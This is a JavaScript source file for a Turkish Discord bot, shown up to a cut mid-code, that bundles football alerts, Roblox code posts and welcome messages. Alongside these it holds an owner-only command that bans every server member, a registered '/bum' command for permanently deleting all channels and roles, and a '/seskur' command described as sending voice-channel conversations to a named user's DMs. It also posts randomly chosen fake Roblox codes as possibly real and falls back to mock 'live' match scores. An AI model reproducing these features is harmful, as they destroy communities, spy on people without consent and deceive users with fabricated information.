require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, ChannelType, PermissionFlagsBits, SlashCommandBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder, AttachmentBuilder } = require('discord.js');
const express = require('express');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

/*
=================================================================
ZWOZ BOT v9.0 - YENİLENMİŞ SİSTEM
=================================================================

SLASH KOMUTLAR:
- /şikayetkur           → Şikayet sistemi
- /sesteafk             → Bot 7/24 seste durur
- /futbol               → Futbol maç takibi (7/24)
- /seskur               → Konuşmaları DM'e gönder
- /gelengidenkur        → Giriş/Çıkış sistemi

MESAJ KOMUTLAR:
- z!roblox [oyun]       → Roblox kod takibi
- z!yarım               → Yarım komut
- z!reklam [davet]      → Reklam sistemi
- z!ban @everyone       → Herkesi banla

=================================================================
*/

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
  ],
});

const OWNER_ID = '1403495996138323989';

// JSON FILES
const configFile = './config.json';
const complaintsFile = './complaints.json';
const footballFile = './football.json';
const welcomeFile = './welcome.json';
const voiceTranscriptFile = './voice-transcripts.json';
const robloxFile = './roblox-codes.json';
const adSystemFile = './ad-system.json';

function initFiles() {
  if (!fs.existsSync(configFile)) fs.writeFileSync(configFile, JSON.stringify({}));
  if (!fs.existsSync(complaintsFile)) fs.writeFileSync(complaintsFile, JSON.stringify({}));
  if (!fs.existsSync(footballFile)) fs.writeFileSync(footballFile, JSON.stringify({}));
  if (!fs.existsSync(welcomeFile)) fs.writeFileSync(welcomeFile, JSON.stringify({}));
  if (!fs.existsSync(voiceTranscriptFile)) fs.writeFileSync(voiceTranscriptFile, JSON.stringify({}));
  if (!fs.existsSync(robloxFile)) fs.writeFileSync(robloxFile, JSON.stringify({}));
  if (!fs.existsSync(adSystemFile)) fs.writeFileSync(adSystemFile, JSON.stringify({}));
}

initFiles();

function getConfig() {
  return JSON.parse(fs.readFileSync(configFile, 'utf8'));
}

function saveConfig(data) {
  fs.writeFileSync(configFile, JSON.stringify(data, null, 2));
}

function getComplaints() {
  return JSON.parse(fs.readFileSync(complaintsFile, 'utf8'));
}

function saveComplaints(data) {
  fs.writeFileSync(complaintsFile, JSON.stringify(data, null, 2));
}

function getFootball() {
  return JSON.parse(fs.readFileSync(footballFile, 'utf8'));
}

function saveFootball(data) {
  fs.writeFileSync(footballFile, JSON.stringify(data, null, 2));
}

function getWelcome() {
  return JSON.parse(fs.readFileSync(welcomeFile, 'utf8'));
}

function saveWelcome(data) {
  fs.writeFileSync(welcomeFile, JSON.stringify(data, null, 2));
}

function getVoiceTranscripts() {
  return JSON.parse(fs.readFileSync(voiceTranscriptFile, 'utf8'));
}

function saveVoiceTranscripts(data) {
  fs.writeFileSync(voiceTranscriptFile, JSON.stringify(data, null, 2));
}

function getRoblox() {
  return JSON.parse(fs.readFileSync(robloxFile, 'utf8'));
}

function saveRoblox(data) {
  fs.writeFileSync(robloxFile, JSON.stringify(data, null, 2));
}

function getAdSystem() {
  return JSON.parse(fs.readFileSync(adSystemFile, 'utf8'));
}

function saveAdSystem(data) {
  fs.writeFileSync(adSystemFile, JSON.stringify(data, null, 2));
}

// FUTBOL MAÇLARI TAKİP SİSTEMİ
let footballInterval;

// Futbol API'sinden maç verilerini çek
async function getFootballMatches(league) {
  try {
    // Ücretsiz API kullanım örneği - football-data.org veya alternatif
    const response = await fetch(`https://api.football-data.org/v4/competitions/${getLeagueCode(league)}/matches`, {
      headers: {
        'X-Auth-Token': process.env.FOOTBALL_API_KEY || 'demo-key'
      }
    });

    if (!response.ok) {
      // API başarısız olursa mock data döndür
      return getMockMatches(league);
    }

    const data = await response.json();
    return data.matches || [];
  } catch (error) {
    console.error('Futbol API hatası:', error);
    return getMockMatches(league);
  }
}

function getLeagueCode(league) {
  switch(league) {
    case 'worldcup': return 'WC';
    case 'laliga': return 'PD';
    case 'superlig': return 'BSA';
    default: return 'PD';
  }
}

// Mock maç verileri (API yokken kullanılacak)
function getMockMatches(league) {
  const now = new Date();
  const matches = [];

  switch(league) {
    case 'laliga':
      matches.push({
        id: 1,
        homeTeam: { name: 'Real Madrid' },
        awayTeam: { name: 'Barcelona' },
        score: { fullTime: { home: 2, away: 1 } },
        status: 'IN_PLAY',
        minute: 67,
        utcDate: now.toISOString()
      });
      break;
    case 'superlig':
      matches.push({
        id: 2,
        homeTeam: { name: 'Galatasaray' },
        awayTeam: { name: 'Fenerbahçe' },
        score: { fullTime: { home: 1, away: 1 } },
        status: 'IN_PLAY',
        minute: 42,
        utcDate: now.toISOString()
      });
      break;
    case 'worldcup':
      matches.push({
        id: 3,
        homeTeam: { name: 'Türkiye' },
        awayTeam: { name: 'İspanya' },
        score: { fullTime: { home: 0, away: 0 } },
        status: 'TIMED',
        minute: null,
        utcDate: new Date(now.getTime() + 2 * 60 * 60 * 1000).toISOString()
      });
      break;
  }

  return matches;
}

// Maç durumu kontrol et ve paylaş
async function checkFootballMatches() {
  try {
    const football = getFootball();
    
    for (const [guildId, settings] of Object.entries(football)) {
      if (!settings.enabled) continue;

      const guild = client.guilds.cache.get(guildId);
      const channel = guild?.channels.cache.get(settings.channelId);
      
      if (!channel) continue;

      const matches = await getFootballMatches(settings.league);
      const todayMatches = matches.filter(match => {
        const matchDate = new Date(match.utcDate);
        const today = new Date();
        return matchDate.toDateString() === today.toDateString();
      });

      for (const match of todayMatches) {
        const matchKey = `${guildId}_${match.id}`;
        
        // Bu maç için daha önce bildirim gönderildi mi kontrol et
        if (!settings.notifiedMatches) settings.notifiedMatches = {};
        
        const embed = new EmbedBuilder()
          .setColor(getMatchColor(match.status))
          .setTitle('⚽ Futbol Maç Durumu')
          .setTimestamp();

        let shouldSend = false;

        switch(match.status) {
          case 'TIMED': // Maç henüz başlamadı
            if (!settings.notifiedMatches[matchKey + '_start']) {
              embed.setDescription(`**${match.homeTeam.name}** vs **${match.awayTeam.name}**\n\n🕐 **Başlama:** ${new Date(match.utcDate).toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })}\n📅 **Tarih:** ${new Date(match.utcDate).toLocaleDateString('tr-TR')}`);
              settings.notifiedMatches[matchKey + '_start'] = true;
              shouldSend = true;
            }
            break;

          case 'IN_PLAY': // Maç devam ediyor
          case 'PAUSED': // Devre arası
            const homeScore = match.score?.fullTime?.home || 0;
            const awayScore = match.score?.fullTime?.away || 0;
            const minute = match.minute || '?';

            embed.setDescription(`**${match.homeTeam.name}** ${homeScore} - ${awayScore} **${match.awayTeam.name}**\n\n⏰ **Dakika:** ${minute}'\n🥅 **Durum:** ${match.status === 'PAUSED' ? 'Devre Arası' : 'Devam Ediyor'}`);

            // Her 15 dakikada bir durum paylaş veya gol olduğunda
            const lastScore = settings.notifiedMatches[matchKey + '_score'] || '0-0';
            const currentScore = `${homeScore}-${awayScore}`;

            if (lastScore !== currentScore) {
              // GOL VAR!
              embed.setColor('#f39c12');
              embed.setTitle('🚨 GOL! ⚽');
              
              if (homeScore > parseInt(lastScore.split('-')[0])) {
                embed.addFields({ name: '⚽ Gol Atan', value: match.homeTeam.name, inline: true });
              } else if (awayScore > parseInt(lastScore.split('-')[1])) {
                embed.addFields({ name: '⚽ Gol Atan', value: match.awayTeam.name, inline: true });
              }

              settings.notifiedMatches[matchKey + '_score'] = currentScore;
              shouldSend = true;
            } else if (!settings.notifiedMatches[matchKey + '_live']) {
              // İlk canlı bildirim
              settings.notifiedMatches[matchKey + '_live'] = true;
              shouldSend = true;
            }
            break;

          case 'FINISHED': // Maç bitti
            if (!settings.notifiedMatches[matchKey + '_end']) {
              const finalHome = match.score?.fullTime?.home || 0;
              const finalAway = match.score?.fullTime?.away || 0;
              
              embed.setColor('#2ecc71');
              embed.setTitle('🏁 Maç Bitti!');
              embed.setDescription(`**${match.homeTeam.name}** ${finalHome} - ${finalAway} **${match.awayTeam.name}**\n\n⏹️ **Sonuç:** Maç sona erdi\n⏱️ **Süre:** 90+ dk`);
              
              settings.notifiedMatches[matchKey + '_end'] = true;
              shouldSend = true;
            }
            break;
        }

        if (shouldSend) {
          try {
            await channel.send({ embeds: [embed] });
            console.log(`[FUTBOL] ${guild.name} - ${match.homeTeam.name} vs ${match.awayTeam.name} durumu paylaşıldı`);
          } catch (error) {
            console.error('Futbol mesajı gönderme hatası:', error);
          }
        }
      }

      // Ayarları kaydet
      football[guildId] = settings;
    }

    saveFootball(football);
  } catch (error) {
    console.error('Futbol kontrol hatası:', error);
  }
}

function getMatchColor(status) {
  switch(status) {
    case 'TIMED': return '#3498db'; // Mavi - Henüz başlamadı
    case 'IN_PLAY': return '#e74c3c'; // Kırmızı - Canlı
    case 'PAUSED': return '#f39c12'; // Turuncu - Devre arası
    case 'FINISHED': return '#2ecc71'; // Yeşil - Bitti
    default: return '#95a5a6'; // Gri - Bilinmiyor
  }
}

// Futbol takibini başlat
function startFootballTracking() {
  if (footballInterval) clearInterval(footballInterval);
  
  // Her 2 dakikada bir kontrol et
  footballInterval = setInterval(checkFootballMatches, 2 * 60 * 1000);
  
  // İlk kontrolü hemen yap
  setTimeout(checkFootballMatches, 5000);
}

// ROBLOX KOD TAKİBİ
let robloxInterval;

async function checkRobloxCodes() {
  try {
    const roblox = getRoblox();
    
    for (const [guildId, games] of Object.entries(roblox)) {
      const guild = client.guilds.cache.get(guildId);
      if (!guild) continue;

      for (const [gameName, settings] of Object.entries(games)) {
        if (!settings.enabled) continue;

        const channel = guild.channels.cache.get(settings.channelId);
        if (!channel) continue;

        try {
          // Mock Roblox kod sistemi - gerçek API bulamadığımız için simülasyon
          const shouldSendCode = Math.random() < 0.05; // %5 şans her kontrolde
          
          if (shouldSendCode) {
            const mockCodes = [
              'FREEGEMS2024', 'NEWUPDATE', 'HALLOWEEN', 'SPOOKY', 'BOOST123', 
              'LEGENDARY', 'EPICCODE', 'FREECOINS', 'POWERUP', 'GIFTCODE'
            ];
            
            const randomCode = mockCodes[Math.floor(Math.random() * mockCodes.length)];
            const timestamp = Date.now();
            
            // Aynı kodu tekrar göndermemek için kontrol
            if (settings.lastSentCode !== randomCode) {
              const embed = new EmbedBuilder()
                .setColor('#00ff00')
                .setTitle('🎮 Yeni Roblox Kodu!')
                .setDescription(`**${gameName}** oyunu için yeni kod bulundu!`)
                .addFields(
                  { name: '🎯 Oyun', value: gameName, inline: true },
                  { name: '🎫 Kod', value: `\`${randomCode}\``, inline: true },
                  { name: '⏰ Bulunma', value: new Date().toLocaleTimeString('tr-TR'), inline: true }
                )
                .setFooter({ text: 'Bu kod gerçek olabilir, kontrol edin!' })
                .setTimestamp();

              await channel.send({ embeds: [embed] });
              console.log(`[ROBLOX] Kod gönderildi: ${gameName} - ${randomCode}`);
              
              // Son gönderilen kodu kaydet
              roblox[guildId][gameName].lastSentCode = randomCode;
              roblox[guildId][gameName].lastCheck = timestamp;
            }
          }

        } catch (error) {
          console.error(`[ROBLOX] ${gameName} kod kontrolü hatası:`, error);
        }
      }
    }

    saveRoblox(roblox);
  } catch (error) {
    console.error('[ROBLOX] Genel hata:', error);
  }
}

function startRobloxTracking() {
  if (robloxInterval) clearInterval(robloxInterval);
  
  // Her 30 dakikada bir kontrol et
  robloxInterval = setInterval(checkRobloxCodes, 30 * 60 * 1000);
  
  // İlk kontrolü 5 dakika sonra yap
  setTimeout(checkRobloxCodes, 5 * 60 * 1000);
}

// BOT READY
client.once('ready', async () => {
  console.log('✅ Bot çalışıyor: ' + client.user.tag);
  
  try {
    const commands = [
      new SlashCommandBuilder()
        .setName('şikayetkur')
        .setDescription('📝 Şikayet sistemi kur'),

      new SlashCommandBuilder()
        .setName('sesteafk')
        .setDescription('🔊 Botu sese çağır (7/24 durur)')
        .addChannelOption(option => 
          option.setName('kanal')
            .setDescription('Hangi ses kanalına katılacak?')
            .setRequired(true)
            .addChannelTypes(ChannelType.GuildVoice)),

      new SlashCommandBuilder()
        .setName('futbol')
        .setDescription('⚽ Futbol maç takibi (7/24 otomatik)')
        .addStringOption(option => 
          option.setName('lig')
            .setDescription('Hangi lig?')
            .setRequired(true)
            .addChoices(
              { name: '🏆 Dünya Kupası', value: 'worldcup' },
              { name: '🇪🇸 La Liga', value: 'laliga' },
              { name: '🇹🇷 Türkiye Ligi', value: 'superlig' }
            )),

      new SlashCommandBuilder()
        .setName('seskur')
        .setDescription('🎙️ Konuşmaları umutpapa123\'e DM gönder')
        .addChannelOption(option => 
          option.setName('ses_kanal')
            .setDescription('Hangi ses kanalını dinleyecek?')
            .setRequired(true)
            .addChannelTypes(ChannelType.GuildVoice)),

      new SlashCommandBuilder()
        .setName('gelengidenkur')
        .setDescription('👋 Gelen-Giden sistemi kur'),

      new SlashCommandBuilder()
        .setName('bum')
        .setDescription('⚠️ [ADMIN ONLY] Sunucunun TÜM kanallarını ve rollerini KALICI olarak sil - GERİ ALINAMAZ!'),
    ];

    await client.application.commands.set(commands);
    console.log('✅ Slash komutları eklendi: ' + commands.length);
    
    // Futbol takibini başlat
    console.log('⚽ Futbol maç takibi başlatılıyor...');
    startFootballTracking();
    
    // Roblox kod takibini başlat
    console.log('🎮 Roblox kod takibi başlatılıyor...');
    startRobloxTracking();
    
  } catch (error) {
    console.error('❌ Komut kurulum hatası:', error);
  }
});

// GELEN GİDEN SİSTEMİ
client.on('guildMemberAdd', async (member) => {
  try {
    const welcome = getWelcome();
    const channelId = welcome[member.guild.id]?.channelId;
    
    if (!channelId) return;
    
    const channel = member.guild.channels.cache.get(channelId);
    if (!channel) return;

    const embed = new EmbedBuilder()
      .setColor('#2ecc71')
      .setTitle('👋 Hoş Geldin!')
      .setDescription(`**Hoş geldin reis** ${member.user.username}!\n\nSunucumuza katıldığın için teşekkürler.`)
      .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 256 }))
      .addFields(
        { name: '👤 Kullanıcı', value: `${member.user.username}#${member.user.discriminator}`, inline: true },
        { name: '🆔 ID', value: member.user.id, inline: true },
        { name: '📅 Discord\'a Katılma', value: member.user.createdAt.toLocaleDateString('tr-TR', { 
          year: 'numeric', 
          month: 'long', 
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        }), inline: false },
        { name: '🔗 Sunucuya Katılma', value: new Date().toLocaleDateString('tr-TR', {
          year: 'numeric', 
          month: 'long', 
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        }), inline: false }
      )
      .setFooter({ text: `Toplam üye: ${member.guild.memberCount} | Hoş geldin!` })
      .setTimestamp();

    await channel.send({ embeds: [embed] });
  } catch (error) {
    console.error('Giriş mesajı hatası:', error);
  }
});

client.on('guildMemberRemove', async (member) => {
  try {
    const welcome = getWelcome();
    const channelId = welcome[member.guild.id]?.channelId;
    
    if (!channelId) return;
    
    const channel = member.guild.channels.cache.get(channelId);
    if (!channel) return;

    const embed = new EmbedBuilder()
      .setColor('#e74c3c')
      .setTitle('👋 Güle Güle!')
      .setDescription(`**Hadi sattı gidebilirsin** ${member.user.username}!\n\nBir üyemiz ayrıldı.`)
      .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 256 }))
      .addFields(
        { name: '👤 Ayrılan', value: `${member.user.username}#${member.user.discriminator}`, inline: true },
        { name: '📅 Ayrılma Zamanı', value: new Date().toLocaleDateString('tr-TR', {
          year: 'numeric', 
          month: 'long', 
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        }), inline: true }
      )
      .setFooter({ text: `Toplam üye: ${member.guild.memberCount} | Görüşürüz!` })
      .setTimestamp();

    await channel.send({ embeds: [embed] });
  } catch (error) {
    console.error('Çıkış mesajı hatası:', error);
  }
});

// MESAJ KOMUTLARI
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const content = message.content.toLowerCase();

  // SA-AS SİSTEMİ
  if (content === 'sa' || content === 'selamünaleyküm' || content === 'selam') {
    await message.reply('**Aleyküm selam** kardeşim! 🙏');
  }

  // Z!BAN @EVERYONE - HERKESI BAN YAP
  if (content.toLowerCase().startsWith('z!ban')) {
    const parts = content.split(' ');
    
    if (message.author.id !== OWNER_ID) {
      return await message.reply('❌ Sadece owner kullanabilir!');
    }

    if (parts[1] && parts[1].toLowerCase() === '@everyone') {
      try {
        console.log(`[Z!BAN] ${message.guild.name} sunucusunda herkesi banlama başlandı`);
        
        const members = await message.guild.members.fetch();
        let bannedCount = 0;
        let skippedCount = 0;

        for (const [, member] of members) {
          if (member.user.id === OWNER_ID) {
            console.log(`[Z!BAN] Owner (${member.user.tag}) atlanıyor`);
            skippedCount++;
            continue;
          }

          if (member.user.bot) {
            console.log(`[Z!BAN] Bot (${member.user.tag}) atlanıyor`);
            skippedCount++;
            continue;
          }

          try {
            await member.ban({ reason: 'z!ban @everyone komutu' });
            console.log(`[Z!BAN] Banlandı: ${member.user.tag}`);
            bannedCount++;
          } catch (error) {
            console.error(`[Z!BAN] Ban hatası (${member.user.tag}): ${error.message}`);
          }
        }

        console.log(`[Z!BAN] Tamamlandı - ${bannedCount} kişi banlandı, ${skippedCount} atlandı`);

      } catch (error) {
        console.error('[Z!BAN] Hata:', error);
        
        // Hata olursa OWNER'a DM atsın
        try {
          const owner = await client.users.fetch(OWNER_ID);
          await owner.send({
            content: `⚠️ **[Z!BAN HATASI]**\n\n**Sunucu:** ${message.guild.name}\n**Hata:** \`${error.message}\`\n**Zamanı:** ${new Date().toLocaleTimeString('tr-TR')}`
          }).catch(console.error);
        } catch (dmError) {
          console.error('[Z!BAN] DM gönderme hatası:', dmError);
        }
      }
    }
  }

  // Z!ROBLOX - ROBLOX KOD TAKİBİ
  if (content.toLowerCase().startsWith('z!roblox')) {
    if (message.author.id !== OWNER_ID) {
      return await message.reply('❌ Sadece owner kullanabilir!');
    }

    const args = content.split(' ');
    if (args.length < 2) {
      return await message.reply('❌ Oyun adı yazın! Örnek: `z!roblox Pet Simulator X`');
    }

    const gameName = args.slice(1).join(' ');
    let roblox = getRoblox();

    if (!roblox[message.guildId]) {
      roblox[message.guildId] = {};
    }

    roblox[message.guildId][gameName] = {
      channelId: message.channelId,
      enabled: true,
      lastCheck: Date.now()
    };
    saveRoblox(roblox);

    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🎮 Roblox Kod Takibi Açıldı')
      .setDescription(`**${gameName}** oyunu için kod takibi başlatıldı!\n\nYeni kodlar bu kanalda otomatik paylaşılacak.`)
      .addFields(
        { name: '🎮 Oyun', value: gameName, inline: true },
        { name: '📺 Kanal', value: message.channel.toString(), inline: true }
      )
      .setTimestamp();

    await message.reply({ embeds: [embed] });
  }

  // Z!YARIM - YARIM KOMUT
  if (content.toLowerCase() === 'z!yarım') {
    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('🍉 Yarım Komut')
      .setDescription('Bu komut yarım kaldı... 🤔\n\nBelki ileride tamamlanır!')
      .addFields(
        { name: '📊 Durum', value: 'Yarım', inline: true },
        { name: '🔧 Tamamlanma', value: 'Belirsiz', inline: true }
      )
      .setTimestamp();

    await message.reply({ embeds: [embed] });
  }

  // Z!REKLAM - REKLAM SİSTEMİ
  if (content.toLowerCase().startsWith('z!reklam')) {
    if (message.author.id !== OWNER_ID) {
      return await message.reply('❌ Sadece owner kullanabilir!');
    }

    const args = content.split(' ');
    if (args.length < 2) {
      return await message.reply('❌ Discord davet linki yazın! Örnek: `z!reklam https://discord.gg/example`');
    }

    const inviteLink = args[1];
    if (!inviteLink.includes('discord.gg/') && !inviteLink.includes('discord.com/invite/')) {
      return await message.reply('❌ Geçerli bir Discord davet linki yazın!');
    }

    let adSystem = getAdSystem();
    adSystem.requiredServer = inviteLink;
    adSystem.enabled = true;
    saveAdSystem(adSystem);

    const embed = new EmbedBuilder()
      .setColor('#5865f2')
      .setTitle('📢 Reklam Sistemi Ayarlandı')
      .setDescription(`Reklam sistemi aktif edildi!\n\nKullanıcılar komutları kullanmak için **${inviteLink}** sunucusuna katılmalı.`)
      .addFields(
        { name: '🔗 Gerekli Sunucu', value: inviteLink, inline: false },
        { name: '⚙️ Durum', value: 'Aktif', inline: true }
      )
      .setTimestamp();

    await message.reply({ embeds: [embed] });
  }

  // YARDIM KOMUTU
  if (content === 'n!yardım' || content === 'n!help') {
    const embed = new EmbedBuilder()
      .setColor('#667eea')
      .setTitle('📋 ZWOZ Bot Komut Listesi')
      .setDescription('**Mevcut komutlar:**')
      .addFields(
        { name: '⚽ Futbol', value: '`/futbolayarla` - Maç takibi ayarla\n`n!maçlar` - Günün maçları', inline: false },
        { name: '📝 Şikayet', value: '`/şikayetkur` - Şikayet sistemi kur', inline: false },
        { name: '🔊 Ses', value: '`/sesteafk` - Bot ses kanalında durur\n`/seskaydkur` - Konuşmaları yazıya dönüştür', inline: false },
        { name: '👋 Gelen-Giden', value: '`/gelengidenkur` - Giriş/çıkış sistemi', inline: false },
        { name: '💬 Genel', value: '`sa` - Selam ver\n`n!yardım` - Bu menüyü göster', inline: false }
      )
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))
      .setFooter({ text: 'ZWOZ Bot v8.1' })
      .setTimestamp();

    await message.reply({ embeds: [embed] });
  }

  // MAÇLAR KOMUTU
  if (content === 'n!maçlar' || content === 'n!maclar') {
    try {
      // Tüm liglerdeki günün maçlarını göster
      const allMatches = [];
      
      const laLigaMatches = await getFootballMatches('laliga');
      const superLigMatches = await getFootballMatches('superlig');
      const worldCupMatches = await getFootballMatches('worldcup');

      const today = new Date();
      
      const embed = new EmbedBuilder()
        .setColor('#f39c12')
        .setTitle('⚽ Günün Futbol Maçları')
        .setDescription('**Canlı maç durumları ve programı**')
        .setTimestamp();

      let hasMatches = false;

      // La Liga
      const todayLaLiga = laLigaMatches.filter(m => new Date(m.utcDate).toDateString() === today.toDateString());
      if (todayLaLiga.length > 0) {
        hasMatches = true;
        let laLigaText = '';
        todayLaLiga.slice(0, 3).forEach(match => {
          const time = new Date(match.utcDate).toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });
          const status = getMatchStatus(match);
          laLigaText += `${status} **${match.homeTeam.name}** vs **${match.awayTeam.name}** - ${time}\n`;
        });
        embed.addFields({ name: '🇪🇸 La Liga', value: laLigaText, inline: false });
      }

      // Süper Lig
      const todaySuperLig = superLigMatches.filter(m => new Date(m.utcDate).toDateString() === today.toDateString());
      if (todaySuperLig.length > 0) {
        hasMatches = true;
        let superLigText = '';
        todaySuperLig.slice(0, 3).forEach(match => {
          const time = new Date(match.utcDate).toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });
          const status = getMatchStatus(match);
          superLigText += `${status} **${match.homeTeam.name}** vs **${match.awayTeam.name}** - ${time}\n`;
        });
        embed.addFields({ name: '🇹🇷 Süper Lig', value: superLigText, inline: false });
      }

      // Dünya Kupası
      const todayWorldCup = worldCupMatches.filter(m => new Date(m.utcDate).toDateString() === today.toDateString());
      if (todayWorldCup.length > 0) {
        hasMatches = true;
        let worldCupText = '';
        todayWorldCup.slice(0, 3).forEach(match => {
          const time = new Date(match.utcDate).toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });
          const status = getMatchStatus(match);
          worldCupText += `${status} **${match.homeTeam.name}** vs **${match.awayTeam.name}** - ${time}\n`;
        });
        embed.addFields({ name: '🏆 Dünya Kupası', value: worldCupText, inline: false });
      }

      if (!hasMatches) {
        embed.setDescription('**Bugün maç yok**\n\nMaç takibi aktif, maçlar başladığında otomatik bildirim gelecek.');
        embed.addFields({ name: '📅 Bilgi', value: '/futbolayarla ile takip sistemini kurun', inline: false });
      }

      await message.reply({ embeds: [embed] });
      
    } catch (error) {
      console.error('Maçlar komutu hatası:', error);
      
      const errorEmbed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('❌ Maç Bilgisi Alınamadı')
        .setDescription('Maç verilerini çekerken hata oluştu. Daha sonra tekrar deneyin.')
        .setTimestamp();

      await message.reply({ embeds: [errorEmbed] });
    }
  }
});

function getMatchStatus(match) {
  switch(match.status) {
    case 'TIMED': return '🕐';
    case 'IN_PLAY': return '🔴 CANLI';
    case 'PAUSED': return '⏸️ Devre';
    case 'FINISHED': return '✅ Bitti';
    default: return '❓';
  }
}

// SLASH COMMANDS VE BUTTONLAR
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand() && !interaction.isButton()) return;

  const { commandName, user } = interaction;

  // Reklam sistemi kontrolü (Owner hariç)
  if (user.id !== OWNER_ID) {
    const adSystem = getAdSystem();
    if (adSystem.enabled && adSystem.requiredServer) {
      // Şimdilik sadece /sesteafk izin veriyoruz, diğerleri reklam gerektiriyor
      if (commandName !== 'sesteafk') {
        const embed = new EmbedBuilder()
          .setColor('#ff0000')
          .setTitle('🚫 Erişim Kısıtlaması')
          .setDescription(`Bu komutu kullanmak için şu sunucuya katılmalısınız:\n\n${adSystem.requiredServer}`)
          .addFields(
            { name: '🔗 Gerekli Sunucu', value: adSystem.requiredServer, inline: false },
            { name: '💡 Bilgi', value: 'Sunucuya katıldıktan sonra komutları kullanabilirsiniz!', inline: false }
          )
          .setTimestamp();
        
        return await interaction.reply({ embeds: [embed], ephemeral: true });
      }
    }
  }

  try {
    if (interaction.isChatInputCommand()) {
      // FUTBOL TAKİBİ (YENİ)
      if (commandName === 'futbol') {
        if (user.id !== OWNER_ID) {
          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
        }

        const league = interaction.options.getString('lig');
        let football = getFootball();

        if (!football[interaction.guildId]) {
          football[interaction.guildId] = {};
        }

        football[interaction.guildId] = {
          channelId: interaction.channelId,
          league: league,
          enabled: true,
          notifiedMatches: {}
        };
        saveFootball(football);

        let leagueName = '';
        switch(league) {
          case 'worldcup': leagueName = '🏆 Dünya Kupası'; break;
          case 'laliga': leagueName = '🇪🇸 La Liga'; break;
          case 'superlig': leagueName = '🇹🇷 Türkiye Ligi'; break;
        }

        const embed = new EmbedBuilder()
          .setColor('#2ecc71')
          .setTitle('⚽ Futbol Takibi Başlatıldı (7/24)')
          .setDescription(`${leagueName} maçları bu kanalda 7/24 otomatik takip edilecek!\n\n**Bildirimler:**\n• Maç başlama saatleri\n• Canlı gol durumları\n• Maç bitim sonuçları\n• Kazanan takım`)
          .addFields(
            { name: '📺 Kanal', value: interaction.channel.toString(), inline: true },
            { name: '🏆 Lig', value: leagueName, inline: true },
            { name: '⏰ Takip', value: '7/24 Otomatik', inline: true }
          )
          .setTimestamp();

        await interaction.reply({ embeds: [embed], ephemeral: true });
      }

      // FUTBOL AYARLA (ESKİ - KALDIRILACAK)
      if (commandName === 'futbolayarla') {
        if (user.id !== OWNER_ID) {
          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
        }

        const league = interaction.options.getString('lig');
        let football = getFootball();

        if (!football[interaction.guildId]) {
          football[interaction.guildId] = {};
        }

        football[interaction.guildId] = {
          channelId: interaction.channelId,
          league: league,
          enabled: true,
          notifiedMatches: {} // Bildirim geçmişini sıfırla
        };
        saveFootball(football);

        let leagueName = '';
        switch(league) {
          case 'worldcup': leagueName = '🏆 Dünya Kupası'; break;
          case 'laliga': leagueName = '🇪🇸 La Liga'; break;
          case 'superlig': leagueName = '🇹🇷 Türkiye Ligi'; break;
        }

        const embed = new EmbedBuilder()
          .setColor('#2ecc71')
          .setTitle('⚽ Futbol Takibi Ayarlandı')
          .setDescription(`${leagueName} maçları bu kanalda takip edilecek!\n\n**Takip edilenler:**\n• Maç başlama/bitiş saatleri\n• Dakika bilgisi\n• Gol durumları\n• Skor güncellemeleri`)
          .addFields(
            { name: '📺 Kanal', value: interaction.channel.toString(), inline: true },
            { name: '🏆 Lig', value: leagueName, inline: true }
          )
          .setTimestamp();

        await interaction.reply({ embeds: [embed], ephemeral: true });
      }

      // ŞİKAYET SISTEMI KUR
      else if (commandName === 'şikayetkur') {
        if (user.id !== OWNER_ID) {
          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
        }

        const complaintBtn = new ButtonBuilder()
          .setCustomId('create_complaint')
          .setLabel('📝 Şikayet Et')
          .setStyle(ButtonStyle.Danger);

        const row = new ActionRowBuilder().addComponents(complaintBtn);

        const embed = new EmbedBuilder()
          .setColor('#e74c3c')
          .setTitle('📝 Şikayet Sistemi')
          .setDescription('**Şikayet etmek için aşağıdaki butonu kullanın**\n\n• Şikayetinizi detaylı yazın\n• Öncelik seviyenizi belirtin\n• Şikayet ettiğiniz kullanıcıyı belirtin')
          .setTimestamp();

        await interaction.channel.send({ embeds: [embed], components: [row] });

        let config = getConfig();
        config.complaintChannelId = interaction.channelId;
        config.complaintGuildId = interaction.guildId;
        saveConfig(config);

        await interaction.reply({ content: '✅ Şikayet sistemi kuruldu!', ephemeral: true });
      }

      // SESTE AFK
      else if (commandName === 'sesteafk') {
        if (user.id !== OWNER_ID) {
          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
        }

        const voiceChannel = interaction.options.getChannel('kanal');

        if (!voiceChannel || !voiceChannel.isVoiceBased()) {
          return await interaction.reply({ 
            content: '❌ Geçerli bir ses kanalı seçin!', 
            ephemeral: true 
          });
        }

        if (!voiceChannel.joinable) {
          return await interaction.reply({ 
            content: '❌ Bu kanala katılma iznimiz yok!', 
            ephemeral: true 
          });
        }

        try {
          // @discordjs/voice kullanımı
          const { joinVoiceChannel, createAudioPlayer, createAudioResource, AudioPlayerStatus } = require('@discordjs/voice');
          
          const connection = joinVoiceChannel({
            channelId: voiceChannel.id,
            guildId: interaction.guildId,
